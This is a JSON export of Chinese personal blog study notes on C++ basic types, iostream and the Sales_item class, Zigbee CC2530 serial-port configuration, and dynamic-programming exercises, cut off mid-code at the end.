[{"title":"变量与基本类型","date":"2020-11-02T13:07:23.482Z","path":"2020/11/02/2020.10.27 变量与基本类型/","text":"前言 不同的编程语言都具备一组公共的语法特征，不同语言之间仅在特征的细节上有所区别。 如，整型、字符型等内置类型。 变量，表达式，语句，if，while控制语句。函数等等…… 大多数编程语言使用两种方式，扩展其基本特征： 赋予程序员自定义数据类型的权力。如 c++ / java 等面向对象语言。 将一些有用的功能，封装成库函数。如 python Smalltalk等语言。 C++ 是一种静态数据类型语言，它的类型检查发生在编译时。因此，编译器必须知道程序中每一个变量对应的数据类型。 一条表达式是否合法，依赖于其中参与运算的对象的类型。 数据类型是程序的基础：它告诉我们数据的意义以及我们能在数据上执行的操作（行为）。 基本数据类型及使用注意事项 类型 含义 最小尺寸 int 整形 16位 long 长整性 32位 long long 长整性 32位 float 浮点型 6位有效数字 double 双精度浮点 10位有效数字 short 短整性 16位 char 字符型 8位 wchar_t 宽字符 16位 bool 布尔型 未定义 为了支持国际化，一个 char 空间应该确保可以存放机器基本字符集中的任意字符对应的数字值。扩展字符集，如 wchar_t， char16_t, char32_t。其中 wchar_t 宽字符，可以确保存放扩展字符集中的任意一个字符，后面两者则是为了 Unicode 字符集服务。 计算机中，一个基本存储单元如下： 地址 比特位 736424 0 0 1 1 1 0 1 1 736425 0 0 0 1 1 0 1 1 736426 0 1 1 1 0 0 0 1 736427 0 1 1 0 0 1 0 0 在 32 位计算机中，一个字，有 32 bit ，有 32 / 8 = 4 Bit字节。 可寻址的最小内存块为 “字节” —— 表中每一行为一个字节。 存储的基本单元成为 “字” —— 表中整个四行，为一个基本存储单元，为一个字。 也就是说，字 &gt; 字节 &gt; 比特。32位系统中，1字 = 4字节 = 32比特，64位操作系统中，1字 = 8字节 = 64比特。 浮点型表示，有单精度，双精度，扩展精度值。分别用 float , double , long double 来表示。 类型 空间 float 1 字 = 32bit double 2 字 = 64bit long double 34 字 = 96128bit 整型 字符型其实也能称之为整型，不过一般情况，用 char 来表示字符，而不是用来表示数字。但是，有时为了表示一个较小的数字，我们也可以用 unsigned char 来表示一个 0 ~ 255 的数字。 int , short , long , long long 都是带符号的，如果在前面加上 unsigned 就是无符号的。无符号，就是只能表示大于 0 的数，同时表示的正数范围变大了一倍。 char , signed char , unsigned char 。字符的表示也有有无符号之分。char 可能是有符号，也可能无符号。后两种分别为有符号，和无符号。 如何选择类型？ 明确知道数据不会为负时 ———— 采用无符号类型 采用 int 做整型运算，范围不够 直接用 long long。一般不用 long 别用 char 和 bool 做计算，除非需要用一个比较小的整数，可以用 unsigned char 或则 signed char 一定要指定类型，需要正负，就用有符号的，不需要就用无符号的。因为 char 是不确定的。 浮点运算直接用 double ， float 精度不行，而且计算代价和 double 差不多，用 double 岂不是很香:laughing: 类型转换 两种不同类型的数据进行运算会发生类型转换。 如果是赋值时不同，那么转换结果为，最终等号左边的类型。 当我们赋给无符号类型，一个超出它范围的值时，结果为初始值对无符号类型所能表示的数的总数取模的余数。总数的意思，就是你这个类型，一供可以表示多少个数，如果范围是 0 ~ 255 那就是能表示 256 个数。 12unsigned char x; // 0 ~ 255x = -1; // x 实际为 (-1 + 256)%256 = 255 **当我们赋给有符号类型，一个超出它范围的值时，结果是未定义的(undefind)**，此时程序会报错，越界，或者生成垃圾值。 当一个算术表达式中，既有 整型 int 又有 无符号 unsigned。那么会首先，将 int 转化成 unsigned ，然后再和 unsigned 进行运算。 循环控制条件中，最好别用 unsigned。 1for( unsigned i = 10; i &gt;= 0; i-- ); //该条件会循环无限次，因为 i 永远满足 i &gt;= 0，不会变成 -1 字面值 正常情况下 - 20 十进制 以 0 开头 - 024 八进制 以 0x 开头 - 0x14 十六进制 十进制字面值，一般用 int 存，如果超出再尝试用 long ，最后用 long long 。还是超界限，那就报错。 八进制，和十六进制字面值，依次用 int ， unsigned int , long , unsigned long , long long , unsigned long long 。或者报错。 负数字面值 -24，先存 24 然后，再对所保存的数去负值。实际上，只是在正数字面值上，多加了一步处理而已。 浮点数字面值，直接用 double 存。 布尔字面值， true or false 两种表示方法。 转义序列 对于一些我们无法打印的字符（回车，退格），或则一些特殊字符（单引号，双引号，反斜杠，问号），需要用到转义字符来处理。 通常使用 \\ 加上特殊符号来表示。\\n , \\t , \\b , …… 字符，字符串加前缀 前缀 含义 类型 u Unicode 16 字符 char16_t U Unicode 32 字符 char32_t L 宽字符 wchar_t u8 UTF-8（仅适用于字面值） char 整型字面值加后缀 u or U 表示 unsigned 如： 32U 为 unsigned x = 32 l or L 表示 long 如：32L 为 long x = 32 ll or LL 表示 long long 如：32LL 为 long long x = 32 以上后缀可复合使用，如 ULL 表示 unsigned long long 型字面值。 浮点型字面值加后缀 f or F 表示 float l or L 表示扩展精度 long double 变量使用注意事项变量定义 类说明符，可以是基本数据类型 int ， 或者自定义数据类型 Sales_item ，或者库类型 std::string 1std::string str(&quot;123&quot;); // str 是一种可变长度的字符序列，以 &#x27;\\0&#x27; 结尾！！ 对象：具有某种数据类型的内存空间。数据类型，不关心是基本数据类型，或者程序员自定义的数据类型。 初始值：注意，初始化不等同于赋值。初始化含义是创建变量时，赋予一个初始值，而赋值的含义是把对象的当前值擦除，而用一个新值来替代。 C++ 11 一种新的初始化变量的方法 —— 使用花括号 {} 1234int a = 0;int a = &#123;0&#125;; // C++ 11 标准中，可以使用花括号，进行 列表初始化。且可以规避丢失值的风险，解释如下文。int a&#123;0&#125;; // 同上一行方法。int a(0); {} 花括号赋初值，列表初始化，如果括号内值的数值类型，转化成被初始化的类型，造成数据丢失，编译器会警告。 123456789struct node&#123; int x; double y;&#125;;long double ld = 3.1425926;int a&#123;ld&#125; , b = &#123;ld&#125;; // 编译器报错，将 double 转 int 造成精度丢失。int a(ld) , a = ld; // 编译通过，精度丢失了，但是我们却不知道。node N&#123;ld, 1.414&#125;; // 列表初始化可以对对象的多个变量进行初始化，第一个会警告精度丢失，第二个值初始化正确。 由此可见，我们最好习惯使用列表初始化的方法，后期有更多广泛的用途…… 默认初始化 基本数据类型（内置类型）： 如果定义的对象在函数体内部，且未初始化，其值是不确定的。 如果定义对象在函数体外部，其值为 0 。 类的对象： 如果没有显式地初始化，那么其值由类确定。 如果类没有确定对象的初始值，那么其值也是不确定的。 另外，类可以规定，是否允许不经过初始化就定义对象。 突然发现 这样子写读书笔迹过于繁琐，浪费时间。以后就不这样更新博客了。 只遇到比较特别的知识点，应用，以及使用技巧，再记录下来。 对于绝大部分语言的细节，就只再书上做个笔记，博客就不再耗费精力更新了。","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"输入输出流与类","date":"2020-10-22T08:15:30.000Z","path":"2020/10/22/2020.10.22 输入，输出，流，类/","text":"Linux 下的C++编程 首先需要编程，肯定需要源文件 我用的 Centos 中的 c++ 原程序可以是 以 .cpp 或者 .cc 结尾的文件存储。 创建文件的方法 vim [文件名]**，删除文件或目录方法 **rm -rf [文件/目录名] 创建目录的方法 mkdir [目录名]**， 删除目录的方法 **rmdir [目录名] 敲好代码之后，就是需要进行编译 编译需要编译器。Linux 中使用 GNU 编译器。 调用 GNU 编译器的命令是 g++ -o [定义可执行文件名] [源文件名] 或者 g++ [源文件] 如果不加参数 -o 与 [输出的文件名] 的话，就直接产生一个默认名为 a.out 的可执行文件文件。 Unix中要么无后缀，或者**.out后缀。Windows 中为 **.exe 为后缀。 编译生成可执行文件之后，就可以运行了 输入可执行文件的 绝对路径， 然后回车就行了。 GNU 编译命令中加参数 -Wall、微软编译器 visual studio 加参数 /w4。打开编译器选项。 输入输出流 iostream 是一个输入输出流 cout , cin ; 是 标准 输入/输出 对象。另外的 cerr 和 clog 使用的比较少，这里不加累述。 关于 endl 一个操纵符，作用是 结束当前行，并将关联的缓冲区中的内容刷到设备中，也就是刷新缓冲区的作用。 关于缓冲区解释参照这篇博客 关于运算符 &lt;&lt; 与 &gt;&gt; &lt;&lt; 左侧运算对象必须为 ostream 类型的对象。 右侧为需要打印的值。 该运算符，将输出值写到 ostream 对象中，然后返回修改后的 ostream 对象。 &gt;&gt; 左侧运算对象必须为 istream 类型的对象。 右侧为需要存放输入数据的变量。 该运算符，返回修改后的 istream 对象，istream对象是随时改变的。 代码解释 1234561. cout &lt;&lt; &quot;str1&quot; &lt;&lt; endl; // 等价于 (cout &lt;&lt; &quot;str1&quot;) &lt;&lt; endl; 先将，str1 写入到标准输出对象中(暂时存放在缓冲区)，然后 endl 刷新缓冲区，并且输出换行。2. while(cin &gt;&gt; v1); // cin 是标准输入流对象。其中的内容是随时间改变的，因此，每次循环，v1 都可以从 cin 中读取不同的数据。 // 因为 &gt;&gt; 操作符返回值是 cin。当 cin 中遇到一个结束符 “EOF” 或者 “一个无效输入” 是，条件为假循环结束。 类介绍书店销售记录保存​ 我们需要实现以下功能，帮助一个书店记录销售记录。 ​ 每条记录包含了三项基本信息：ISBM号、书的单价、售出册数 ​ 同时，便于老板查询销售情况，需要计算 每本书的销售量、销售总额、及平均售价。 为了使用一个类，我们需要明白三件事： 类名是什么？Sales_item 因为需要知道每一本书的销售总量、与销售总额、两者相除即可知道平均售价。 所以我们需要一个类 Sales_item 来记录一本书的以上三种属性。 暂时，先不深究它是如何实现的。 它在哪里被定义？ 每个类实际上就是定义了一种类型，类型名就是类名。 我们可以使用它，来定义类类型的变量。 Sales_item 存在 Sales_item.h 中被定义，使用时需要包含该头文件，即可定义该类类型的变量。 它支持什么操作？ 初始化 / 赋值操作 定义类，是为了使用类变量，既然是变量，就需要给予一定的值。 方法一，输入值，需要支持 &gt;&gt; 输入运算符。 方法二，直接赋值，需要支持 = 运算符。 输出 / 读取操作 方法一，使用类中的成员方法，比如 isbn() 来获取类变量中的某一属性，如 ISBN 编码。 方法二，输出值，需要支持 &lt;&lt; 输出运算符。 同一类变量的相互运算操作 既然是变量，那就会用到变量之间的运算，比如，**加，减，+=**等复合运算。 销售记录相加，需要支持 + 运算，将 isbn 码相同的记录对应的销售额，与销售量进行相加。 累加，需要支持 += 运算，将两者相加的结果，再赋值给运算符左边的对象（类变量）。 重定向命令 为了避免反复键盘输入数据，这里使用文件重定向。实现，将程序标志输入，输出与名命文件联系起来。 a.out outfile 其中的 ‘&lt;’** 命令表示重定向输入；**’&gt;’ 命令表示重定向输出。 该语句，表示将 infile 文件中的数据作为程序 a.out 的标准输入。并且将程序的标准输出，输出到文件 outfile 中。 Linux 下C++工程组织架构 首先，一般新建一个工程文件目录，比如 SalesPro 其中一般包含三个目录 sourse：该目录下包含程序文件，包括 sell.cc、Sales_item.h。以及编译生成的可执行文件 a.out、sell infile：该目录下包含输入的测试数据，indata outfile： 该目录用来存放测试程序时，所输出的文件。 tree 使用 tree 命令同样可以输出目录树。同 Windows 下的 tree 命令。 代码Sales_item.h 中所定义的 Sales_item 类以下类的定义暂时我们不需要懂，只需要知道如何使用该类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#ifndef SALESITEM_H// we&#x27;re here only if SALESITEM_H has not yet been defined #define SALESITEM_H// Definition of Sales_item class and related functions goes here#include &lt;iostream&gt;#include &lt;string&gt;class Sales_item &#123;// these declarations are explained section 7.2.1, p. 270 // and in chapter 14, pages 557, 558, 561friend std::istream&amp; operator&gt;&gt;(std::istream&amp;, Sales_item&amp;);friend std::ostream&amp; operator&lt;&lt;(std::ostream&amp;, const Sales_item&amp;);friend bool operator&lt;(const Sales_item&amp;, const Sales_item&amp;);friend bool operator==(const Sales_item&amp;, const Sales_item&amp;);public: // constructors are explained in section 7.1.4, pages 262 - 265 // default constructor needed to initialize members of built-in type Sales_item() = default; Sales_item(const std::string &amp;book): bookNo(book) &#123; &#125; Sales_item(std::istream &amp;is) &#123; is &gt;&gt; *this; &#125;public: // operations on Sales_item objects // member binary operator: left-hand operand bound to implicit this pointer Sales_item&amp; operator+=(const Sales_item&amp;); // operations on Sales_item objects std::string isbn() const &#123; return bookNo; &#125; double avg_price() const;// private members as beforeprivate: std::string bookNo; // implicitly initialized to the empty string unsigned units_sold = 0; // explicitly initialized double revenue = 0.0;&#125;;// used in chapter 10inlinebool compareIsbn(const Sales_item &amp;lhs, const Sales_item &amp;rhs) &#123; return lhs.isbn() == rhs.isbn(); &#125;// nonmember binary operator: must declare a parameter for each operandSales_item operator+(const Sales_item&amp;, const Sales_item&amp;);inline bool operator==(const Sales_item &amp;lhs, const Sales_item &amp;rhs)&#123; // must be made a friend of Sales_item return lhs.units_sold == rhs.units_sold &amp;&amp; lhs.revenue == rhs.revenue &amp;&amp; lhs.isbn() == rhs.isbn();&#125;inline bool operator!=(const Sales_item &amp;lhs, const Sales_item &amp;rhs)&#123; return !(lhs == rhs); // != defined in terms of operator==&#125;// assumes that both objects refer to the same ISBNSales_item&amp; Sales_item::operator+=(const Sales_item&amp; rhs) &#123; units_sold += rhs.units_sold; revenue += rhs.revenue; return *this;&#125;// assumes that both objects refer to the same ISBNSales_item operator+(const Sales_item&amp; lhs, const Sales_item&amp; rhs) &#123; Sales_item ret(lhs); // copy (|lhs|) into a local object that we&#x27;ll return ret += rhs; // add in the contents of (|rhs|) return ret; // return (|ret|) by value&#125;std::istream&amp; operator&gt;&gt;(std::istream&amp; in, Sales_item&amp; s)&#123; double price; in &gt;&gt; s.bookNo &gt;&gt; s.units_sold &gt;&gt; price; // check that the inputs succeeded if (in) s.revenue = s.units_sold * price; else s = Sales_item(); // input failed: reset object to default state return in;&#125;std::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const Sales_item&amp; s)&#123; out &lt;&lt; s.isbn() &lt;&lt; &quot; &quot; &lt;&lt; s.units_sold &lt;&lt; &quot; &quot; &lt;&lt; s.revenue &lt;&lt; &quot; &quot; &lt;&lt; s.avg_price(); return out;&#125;double Sales_item::avg_price() const&#123; if (units_sold) return revenue/units_sold; else return 0;&#125;#endif 该章节最终程序实现，输入多条销售记录，其中isbn码相同的销售记录相邻。输入，每种书籍的销售总额、总销售量、以及平均售价。 思路：创建一类变量，用来保存上一次输入的销售记录；另外再创建一个类变量，用来保存这一次输入的销售记录。 如果两次连续输入的销售记录的 ISBN 编码相同，那么就将第二个类变量累加到第一个类变量当中。如何继续输入。 如果两次连续输入的 ISBN 编码不同，那么进行一次输出，并且将第一个类变量，替换成第一个类变量。继续输入。 如果输入为空，输出错误警告。 记得，最后需要输出，第一个类变量的值。 123456789101112131415161718192021222324252627282930include &lt;iostream&gt;#include &quot;Sales_item.h&quot;using namespace std;int main()&#123; Sales_item per; if(cin &gt;&gt; per) &#x2F;&#x2F; 先输入一条销售记录 &#123; Sales_item cur; while(cin &gt;&gt; cur) &#123; if(per.isbn() &#x3D;&#x3D; cur.isbn()) &#x2F;&#x2F; 输入的下一条销售记录与之前一条的一致，进行累加 &#123; per +&#x3D; cur; &#125; else &#x2F;&#x2F; 不一致，进行输出累加结果，并且保存新记录 &#123; cout &lt;&lt; per &lt;&lt; endl; per &#x3D; cur; &#125; &#125; cout &lt;&lt; per &lt;&lt; endl; &#125; else &#x2F;&#x2F; 如果没有输入数据，那么输出错误提示。 &#123; cerr &lt;&lt; &quot;No Data?!&quot; &lt;&lt; endl; return -1; &#125; &#125; 输入1 12345670-201-78345-X 3 20.000-201-78345-X 2 15.000-201-78345-X 1 10.011-321-12345-B 10 100.001-321-12345-B 2 10.402-111-11111-1 3 103-112-12121-4 4 7 输出1 12340-201-78345-X 6 100.01 16.66831-321-12345-B 12 1020.8 85.06672-111-11111-1 3 30 103-112-12121-4 4 24 6 输入2 空 输出2 error: No Data?! 小细节 Cerr 一个 ostream 对象，关联到标准错误，通常写入到与标准输出相同的设备。默认情况下，写到 cerr 的数据是不缓冲的。 cerr 通常用于输出错误信息，或其他不属于程序正常逻辑的输出内容。 缓冲区（buffer） 一个存储区，用于保存数据。IO设备通常将输入输出保存在一个缓冲区中，读写的动作与程序中的动作无关。 我们可以显式地刷新输出缓冲区，以便强制将其中的数据写入输出设备。 默认情况，读cin会刷新cout；程序非正常终止，会刷新cout。 未初始化变量 类类型的变量如果没有初始化，则按照类定义指定的方式进行初值指定。 定义在函数内部的内置类型变量默认不初始化的，除非有显式初始化语句。 :: 运算符 作用域运算符。比如访问命名空间中的名字，可以：std::cout 表示命名空间 std 中的名字 cout","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"串口","date":"2020-10-18T16:00:00.000Z","path":"2020/10/19/2020.09.28 串口/","text":"zigbee USB转串口驱动安装1234567891011121. 连接方法: 1) 通过数据线，直接连接 笔记本电脑 与 胜达电子学习板。 2) 学习板串口位置，会连接一个 PL-2303 USB 转串口芯片。 3) 此时的计算机还不能识别该设备，需要安装该芯片的驱动。2. 安装 PL-2303 驱动程序: 1) 安装驱动之前，需要卸&#x27;载掉并且删除&#x27;掉原来的串口驱动程序。 * 在设备管理器页面，找到端口，然后右击卸载并且删除驱动。 * 这一步必须删除干净，不然驱动程序会安装失败。 2) 双击 &#x27;PL-2303 Driver Installer Program&#x27; 驱动程序，一直下一步进行安装。 3) 安装完成后，查看设备管理器端口，会看到有&#x27;Prolific USB-to-Serial Comm Port (COM4)&#x27; 串口 工作环境，必须是32M晶振条件下。因此，使用串口功能的时候，必须改变 Zigbee 的工作晶振。 由 16MHz内部RC震荡电路 转换到 32MHz外部晶振 时钟配置代码： 12345678910void Cfg32M(void)&#123; SLEEPCMD &amp;= 0xfb; // 1111 1011 开启两个高频时钟沿 while((SLEEPSTA &amp; 0x40)==0); // 判断第四位是否为 1，为 1 的话稳定，等待 32 M 稳点 //delayms(); 此处延时 62us ，不延时也可以 CLKCONCMD &amp;= 0xf8; //1111 1000 后三位清零 不分频输出 CLKCONCMD &amp;= 0xbf; // 1011 1111 设置 32M 作为系统主时钟 while(CLKCONCMD &amp; 0x40); // 等待 32M 成功成为当前系统主时钟 SLEEPCMD |= 0x40; // 0000 0100&#125; 串口通讯：串口按位(bit)发送，和接收字节。 典型的：串口用于 ASCII 码字符的传输。通讯使用3根线完成，分别是地线、发送、接收。 通讯方式：异步通讯。 主要参数：波特率、数据位、停止位、奇偶校验。 波特率：符号的传输速率，24000 bit/s = 240 * 10 bit/s 每秒钟传 240个字符，一个字符 10 位。 8个数据位，一个起始位，一终止位。 串口配置的步骤 指定串口的 IO 位置； CC2530 具备 2 个串口； 每个串口又同时具有两个备用位置。 串口 0： Tx—-P03 与 Rx—–P02 Tx—-P15 与 Rx—–P14 串口 1： Tx—-P04 与 Rx—–P5 Tx—-P06 与 Rx—–P17 修改寄存器 PERCFG 的第 0 位 为 0 ，则选择串口 0 进行工作。 PERCFG &amp;= ~(0x01&lt;&lt;0); 为 1 ，则选择串口 1 进行工作。 PERCFG |= (0x01&lt;&lt;0); 响应 IO 配置成片上外设功能； 因为引脚所连接的串口功能，属于片上外设。所以需要配置相应引脚寄存器 PxSEL 为 1。 串口0，串口1 的备用 位置1 都在 P0 组。备用 位置2 都在 P1 组。 P0SEL |= 0x0C; 将 串口0 备用 位置1 所连接引脚设备片上外设的串口功能。 8个数据位、1个停止位、无流控、无校验确立； U0CSR |= 0xC0; 只管这样子配置的寄存器就行了，别纠结为啥这样配置。 设置波特率； 查表，了解到，如果要配相应波特率，该如何设置的控制变量 UxGCR 和 UxBAUD U0GCR = 11; U0BAUD = 216; 这样子实现了将波特率配置成115200 bps 起始到目前为止，这样子配置就已经建立了 zigbee 与 计算机 之间的串口通信甬道了。 以下，介绍一些常用的数据传送方式。 串口配置代码代码： 12345678void CfgSerPorCfg(void) //配置串口 configuration serial port&#123; PERCFG &amp;= ~(0x01&lt;&lt;0); //选择串口0，的备用位置1 P0SEL |= 0x0C; //将Tx,RX连接的 P03和P02 配置位片上外设 U0CSR |= 0xC0; //设置数据帧格式 U0GCR = 8; //配置波特率为 9600bps U0BAUD = 59;&#125; 串口通信 相关知识点总结： Zigbee 串口通信都是一次传送一个字符的。也即是一个 char 数据类型。 Zigbee 串口通信，发送 或者是 接受，都需要经过数据缓冲寄存器 UxDBUF，其中 x 为 0 或者 1 ，却决于采用串口0，还是串口1。 UxDBUF 不是一个寄存器，而是两个名称相同的寄存器。一个用来接收数据，一个用来发送数据。 当我们对 UxDBUF 读取的时候，默认是用到了接受数据的那个 UxDBUF 当我们对 UxDBUF 赋值的时候，默认是用到了发送数据的那个 UxDBUF 既然有数据缓冲寄存器，那么如何判断，缓冲寄存器的数据是否得到了数据，或者将缓冲区数据刷新到了串口进行发送了呢？ 这就另外引入两个标志位。UxRXIF 和 UxTXIF UxRXIF：如果数据缓冲寄存器得到串口的数据，那么该标志位被系统置 1。 UxTXIF：如果数据缓冲寄存器的数据被刷入到串口，那么该标志位被系统置 1。 通过判断这两个寄存器，可以得出我们的数据是否被接收到，或者发送出了。 我们一般如何将 Zigee 的数据通过串口发送到笔记本？ 先做好串口初始化配置，参照上文步骤。 然后对 数据缓冲寄存器 UxDBUF 赋值（接受 char 类型的数据）就行了。U0DBUF = ‘a’ 等待标志位 UxTXIF 自动变成1，表示数据发送成功了。while(U0TIF == 0); 然后，将标志位清零，为下一次发送字符做准备。U0TXIF = 0; 1234567891011121314#include &lt;cc2530.h&gt;void main()&#123; Cfg32M(); CfgSerPor(); // 通过串口，发送字符串 &quot;I LOVE YOU!&quot; char str[20] = &quot;I LOVE YOU!&quot;; int i = 0; while( str[i]!=&#x27;\\0&#x27; )&#123; U0DBUF = str[i++]; while( U0TXIF == 0 ); U0TXIF = 0; &#125;&#125; 我们一般如何接收串口发送过来的数据？ 串口接受到的数据在寄存器 UxDBUF 中，同时标志位 UxRXIF 会被系统置1。 首先得判断串口是否有数据传送过来，我们总不能用程序一直进行循环判断吧。要是能够采用中断查询就好了，这样，等待有数据从串口传送过来，程序才进行处理。Zigbee协议栈中，就有这种系统中断！😁下面介绍，如何用中断查询串口数据。 开串口接受数据中断（这是一个比较长的中断名字😂） 第一步，开 CPU总中断。 EA = 1。 第二步，开系统中的串口接收数据中断（顾名思义，就是接受到来自串口的数据，触发的中断）。 使能寄存器为：URX0IE = 1，如果是串口1的话就是用 URX1IE 然后写中断处理函数。如何处理得到的数据。 设置串口接受数据中断处理函数向量 #pragma vector = URX0_VECTOR 中断查询代码： 123456789101112131415161718192021222324#include &lt;cc2530.h&gt;void main(void)&#123; Cfg32M(); //一定要工作在 32M 晶振频率下 CfgSerPor(); //配置串口0的备用位置1 // 配置 串口0接收数据中断 EA = 1; //开CPU总中断 URX0IE = 1; //把串口0接受数据中断打开。&#125;#pragma vector = URX0_VECTOR //串口0接收数据中断向量__interrupt void SerialPortInt(void) //串口0接收数据中断处理函数&#123; //接受数据 char ch; ch = U0DBUF; //拿数据 URX0IF = 0; //数据拿走了，可以清除标志位了，为下一次接收做准备。 //处理拿到的数据 ch += 1; //随意改变以下 U0DBUF = ch; //然后发送出去 while(UTX0IF == 0); //等待数据发送成功。 UTX0IF = 0; //发送完毕，清除发送成功的标志位，为下一次发送做装备。&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"DP动态规划","date":"2020-10-15T09:26:30.000Z","path":"2020/10/15/2020.10.15 DP/","text":"样例1：铺满 2*N 方格描述杭电题目链接 在2×n的一个长方形方格中,用一个1× 2的骨牌铺满方格,输入n ,输出铺放方案的总数. 输入输入数据由多行组成，每行包含一个整数n,表示该测试实例的长方形方格的规格是2×n (0&lt;n&lt;=50)。 输出对于每个测试实例，请输出铺放方案的总数，每个实例的输出占一行。 样例12345678输入：1350输出：1320365011074 代码1234567891011121314#include &lt;stdio.h&gt;typedef long long ll;ll f[51];int main()&#123; int n; f[0] = f[1] = 1; for( int i = 2; i &lt;= 50; i++ ) f[i] = f[i-1] + f[i-2]; while( scanf(&quot;%d&quot;, &amp;n) != EOF ) printf( &quot;%lld\\n&quot;, f[n] ); return 0;&#125; 思路 f[i] 表示放满第 i 列的方法数。 考虑第 i 列 要么横着放置两个，方法数 = f[i-2]。影响范围最远扩散到 i-2 要么竖着放置一个，方法数 = f[i-1]。影响范围最远扩散到 i-1 结合两者情况，得到递推式 f[n] = f[n-1] + f[n-2] 总结 将一个大问题，分解成两个，或者多个子问题。假设，子问题的答案以已知。 如何确定大问题? 在一维dp 中，最终需要求解的就是大问题。 如果是多维dp，大问题就是当前维度的所有情况。 小问题就是，把当前维度的所有情况往前递推。 具体参考下一个样例进行理解。 如何确定小问题？ 分情况考虑大问题，最终会将范扩散到如求解小问题。 比如，此题，考虑到第 n 列可以有两种情况。分别需要用到 f[n-1] 和 f[n-2]。 得到递推式。 f[n] = f[i-1] + f[i-2] 确定边界值。 考虑推式的边界情况。f[2] = f[1] + f[0] 。 易知 f[2] = 2 ， f[1] = 1 。那么 f[0] = f[2] - f[1] = 1 此时，初始化打表时，需要将 f[0] 置 1 样例2：铺满 3*N 方格题目描述题目 将上一个题目的描述改成，在 3*N 的长方形中，铺满 1 * 2 大小的骨牌。 样例12345678910111213输入：12341000输出：0301174979 思路 当每一列的长度变成 3 的时候，我们再来考虑最多第 n 列的大问题，如果用一维的分解思路，并不能推出所有的子问题。比如下面n=4时，下面两种情况: 这种情况下 f[4] 并不能完全分解为 f[2] 或者 f[1] 两种情况，因为有些方块可能跨越两列。这时就需要用到二维的dp，增加一个维度的参数。比如 f[ i ] [ j ] 表示，铺满 i 列，多余 j 个。 此时，因为维度改变了，所以我们需要求的大问题是所有的 f[i] ，也就是 f[ j ] [ 0 ] ， f[ j ] [ 1 ]， f[ j ] [ 2 ] 通过每一个大问题得到一个递推式： f[ i ] [0] ：铺满 i 列后，一个都不剩。可由三种子问题推出： f[ i-2 ] [0] + 3横放骨牌 f[ i-2 ] [2] + 1横 + 1竖着 f[ i-1 ] [2] + 1竖 f[ i ] [1] : 铺满 i 列后，还多一个方格。可由一种子问题推出： f[ i-1 ] [2] + 1横 f[ i ] [2]：铺满 i 列后，还多出两个方格。可由两种子问题推出： f[ i ] [0] + 1竖 f[ i-1] [1] + 2横 最终递推式： 123f[i][0] = f[i-2][0] + f[i-2][2] + f[i-1][1];f[i][1] = f[i-1][2];f[i][2] = f[i][0] + f[i-1][1]; 确定边界： 每个递推式，都需要用到前一行，或者两行。 所以需要预先确定二维数组最前面的两行值。 12f[0][1] = f[1][0] = f[1][2] = 0;f[0][0] = f[0][2] = f[1][1] = 1; 代码123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;const int M = 1e5+3; //答案对 M 取模int f[10005][3];void work()&#123; f[0][1] = f[1][0] = f[1][2] = 0; f[0][0] = f[0][2] = f[1][1] = 1; for( int i = 2; i &lt;= 1000; i++ ) &#123; for( int j = 0; j &lt; 3; j++ ) &#123; switch(j)&#123; case 0: f[i][j] = (f[i-2][0] + f[i-2][2] + f[i-1][1])%M; break; case 1: f[i][j] = f[i-1][2]; break; case 2: f[i][j] = (f[i][0] + f[i-1][1])%M; break; &#125; &#125; &#125;&#125;int main()&#123; int n; work(); // 打表 while( scanf(&quot;%d&quot;, &amp;n) != EOF ) &#123; if( n%2 != 0 ) printf( &quot;0\\n\\n&quot; ); // 如果 3*n ， n 为奇数， 那么总面积为奇数，不可能是 1*2 的倍数。 else printf( &quot;%d\\n\\n&quot;, f[n][0] ); &#125; return 0;&#125; 总结 一维解决不了的时候，想想如何多加一个参数，形成二维。 二维的大问题不止一个，因此，递推式也不止一个。 样例3：数的划分链接：https://ac.nowcoder.com/acm/problem/16695来源：牛客网 将整数n分成k份，且每份不能为空，任意两个方案不能相同(不考虑顺序)。 例如：n=7，k=3，下面三种分法被认为是相同的。 1，1，5; 1，5，1; 5，1，1; 问有多少种不同的分法。 输入：n，k ( 6 &lt; n ≤ 200，2 ≤ k ≤ 6 ) 输出：一个整数，即不同的分法。 输入描述:1两个整数 n,k ( 6 &lt; n ≤ 200， 2 ≤ k ≤ 6 ) 输出描述:11个整数，即不同的分法。 示例1输入17 3 输出14 思路 刚拿到这题，第一想法是用 dfs，但是不知道咋去掉重复的情况了。看题解用动态，然而递推式让我感觉很迷啊，为毛会想得到用这种递推式？？？？？？:sob: 首先确定大问题：将 n 分成 k 份。 然后如何确定小问题呢？ 小问题的解的和，一定要包含大问题所有的情况。在这里，用到了一个很巧妙的分解方法。也就是一下两个子问题。 子问题一：将 n 分成 k 份，每一份都 &gt; 0。如果我们假设每一份都 &gt; 1 ，那么问题就变成了将 n-k 份成 k 份。因为，每一份都至少有一个1，所以用到了k，只需要再份 n-k 就行了。另外，因为每一份都要大于1，所以剩下的 n-k 还得分到 k 份当中。 子问题二：将 n 分个1出来，单独作为1份，将剩下的 n-1 分成 k-1 份。我靠，为啥要这样子分？？？因为，子问题1中，我们假设每一份都大于1了，那么还有等于1的情况没有考虑，所以我们需要加上至少有1份等于1的情况，这样才能保证完整性，不遗漏。 设 dp[ i ] [ j ] 表示，将数 i 划分成 j 份。我们所求即为 dp[ n ] [ k ] 递推公式：dp[ i ] [ j ] = dp[ i-j ] [ j ] + dp[ i-1 ] [ j-1 ] 总结 我们在确定小问题的时候需要注意 子问题一定要是二位数组之前的量。比如 dp[ i ] [ j ] 大问题，子问题一定要从该位置的上方，或者前方找。 划分子问题时 子问题所有解的集合，一定要是大问题所有解。不能有情况遗漏。 动态规划问题，最难就难在找不到如何正确找到划分大问题的办法。 我们在思考将 n 个数分解成 k 个数的时候。需要思考分解的特点。 要么每一份都大于 1 ， 要么 至少有一份等于1。这样就分解成两个子问题了。这涉及到高中的组合数的知识。 代码12345678910111213141516171819202122232425#include &lt;cstdio&gt;int dp[201][8];int main()&#123; int n, k; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for(int i = 0; i &lt;= n; i++)&#123; dp[i][1] = 1; // 